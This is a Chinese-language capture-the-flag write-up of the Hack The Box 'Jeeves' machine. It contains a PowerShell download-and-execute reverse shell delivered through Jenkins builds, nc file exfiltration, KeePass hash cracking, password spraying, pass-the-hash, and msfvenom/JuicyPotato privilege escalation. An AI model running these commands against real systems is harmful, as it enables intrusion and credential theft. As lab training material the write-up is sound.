# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 探测

开放端口
```
┌──(root㉿ss)-[~/htb]
└─# nmap -p- --open --min-rate=1000 10.10.10.63 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 09:42 EDT
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.63
Host is up (0.0089s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 117.43 seconds

```

详细端口信息
```
┌──(root㉿ss)-[~/htb]
└─# nmap -sV -Pn -A -O 10.10.10.63 -p 80,135,445,50000     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 09:45 EDT
Nmap scan report for 10.10.10.63
Host is up (0.0069s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1607 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-05-31T18:46:04
|_  start_date: 2022-05-31T18:42:02
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   5.94 ms 10.10.14.1
2   5.96 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.60 seconds

```

# 445

没有登录凭证什么卵都看不了

# 80
```
┌──(root㉿ss)-[~/htb]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.63  

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.63/_22-05-31_09-53-38.txt

Error Log: /root/dirsearch/logs/errors-22-05-31_09-53-38.log

Target: http://10.10.10.63/

[09:53:38] Starting:    
[09:56:04] 200 -   50B  - /error.html                                       
[09:56:32] 200 -  503B  - /index.html 
```

只有两个静态页面，任何输入都会导向error.html，挂着一张sql报错的图片，兔子洞无疑。



# 50000

大目录爆破
```
┌──(root㉿ss)-[~/htb]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.63:50000 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545

Output File: /root/dirsearch/reports/10.10.10.63-50000/_22-05-31_10-24-01.txt

Error Log: /root/dirsearch/logs/errors-22-05-31_10-24-01.log

Target: http://10.10.10.63:50000/

[10:24:01] Starting: 
[10:26:31] 302 -    0B  - /askjeeves  ->  http://10.10.10.63:50000/askjeeves/
                                                                              
Task Completed

```


```/askjeeves/```是jenkins程序

这个我们就很熟悉了，可以通过build模块直接执行系统命令

这个程序测试不需要登录就可以build命令

使用下面payload

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.4/rev.ps1')
```

本地起一个python的web服务器

点击build

拿到foodhold
```
┌──(root💀kali)-[~/htb/Jeeves]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.63] 49677
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins\workspace\max>whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins\workspace\max> 

```

拿到user flag
```
PS C:\Users\kohsuke\desktop> ls


    Directory: C:\Users\kohsuke\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        11/3/2017  11:22 PM             32 user.txt                                                              


PS C:\Users\kohsuke\desktop> type user.txt
e3232272596...

```

# 提权

## 提权方法一：keepass + pth

找到一个keepass文件
```
PS C:\Users\kohsuke\Documents> ls


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              



```


传nc到靶机
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4/nc.exe','C:\Users\kohsuke\Documents\nc.exe')"
```

接收
```
┌──(root💀kali)-[~/htb/Jeeves]
└─# nc -lvp 443 > CEH.kdbx                                                                            1 ⨯
listening on [any] 443 ...
connect to [10.10.16.4] from 10.10.10.63 [10.10.10.63] 49686
```

发送
```
PS C:\Users\kohsuke\Documents> cmd.exe /C nc.exe 10.10.16.4 443<CEH.kdbx
```

转成john可以识别的格式
```
┌──(root💀kali)-[~/htb/Jeeves]
└─# keepass2john CEH.kdbx >keep.hash
                                                                                                          
┌──(root💀kali)-[~/htb/Jeeves]
└─# cat keep.hash 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

爆破
```                                                                                          
┌──(root💀kali)-[~/htb/Jeeves]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt keep.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:16 DONE (2022-05-31 11:07) 0.05906g/s 3247p/s 3247c/s 3247C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

密码：moonshine1

用软件打开kdbx文件，输入上面破解的密码，得到下面一组账号信息
```
anonymous：Password
Michael321：12345
admin：F7WhTrSFDKB6sxHU1cUn
hackerman123：pwndyouall!
bob：lCEUnYPjNfIuPZSzOySA
administrator：S1TjAtJHKsugh9oC4VZl
?:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

## 密码喷洒

整理user
```
anonymous
Michael321
admin
hackerman123
bob
administrator
kohsuke
```

整理pass
```
Password
12345
F7WhTrSFDKB6sxHU1cUn
pwndyouall!
lCEUnYPjNfIuPZSzOySA
S1TjAtJHKsugh9oC4VZl
```

密码喷洒
```
┌──(root💀kali)-[~/htb/Jeeves]
└─# cme smb 10.10.10.63 -u user.txt -p pass.txt   
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:Password STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE
```

全军覆没了属于是

但是我们还有一个NTML哈希没有试

```
┌──(root💀kali)-[~/htb/Jeeves]
└─# crackmapexec smb 10.10.10.63 -u user.txt -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
^C

[*] Shutting down, please wait...
^CSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Michael321:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\hackerman123:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\bob:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\administrator aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

```

中了administrator

### pth

哈希传递，拿到administrator的shell
```
──(root💀kali)-[~/htb/Jeeves]
└─# pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
jeeves\administrator

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.63
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{4079B648-26D5-4A56-9108-2A55EC5CE6CA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 


```

桌面的txt文件不是flag
```
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,470,637,056 bytes free

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.

```

加上参数/r /a
```
c:\Users\Administrator\Desktop>dir /r /a
dir /r /a
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
11/03/2017  10:03 PM               282 desktop.ini
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)          1,115 bytes
               2 Dir(s)   7,470,637,056 bytes free

```

使用more命令读取flag
```
c:\Users\Administrator\Desktop>more <hm.txt:root.txt
more <hm.txt:root.txt
afbc5bd4b615a6....

c:\Users\Administrator\Desktop>

```



## 提权方法二：SeImpersonatePrivilege

查看当前账号能力
```
PS C:\Users\kohsuke\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

有SeImpersonatePrivilege和SeCreateGlobalPrivilege能力，都可以用来提权

编译一个反弹shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.4 LPORT=443 -f exe >rev.exe
```


传烂土豆
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4/JuicyPotato.exe','C:\Users\kohsuke\Documents\JuicyPotato.exe')"
```

传反弹shell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4/rev.exe','C:\Users\kohsuke\Documents\rev.exe')"
```

执行烂土豆
```
PS C:\Users\kohsuke\Documents> cmd /c 'JuicyPotato.exe -l 1337 -p rev.exe -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}'
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1337
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\Users\kohsuke\Documents> 

```

这里要注意，由于我们编译的时候用的是分段shell```windows/shell/reverse_tcp```，这里需要用handler接收

如果使用非分段payload```windows/shell/reverse_tcp```，烂土豆执行好像又会有问题。。

收到system shell

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.4:443 

[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.63
[*] Command shell session 1 opened (10.10.16.4:443 -> 10.10.10.63:49737) at 2022-05-31 12:30:03 -0400


C:\Windows\system32>
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.63
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{4079B648-26D5-4A56-9108-2A55EC5CE6CA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Windows\system32>

```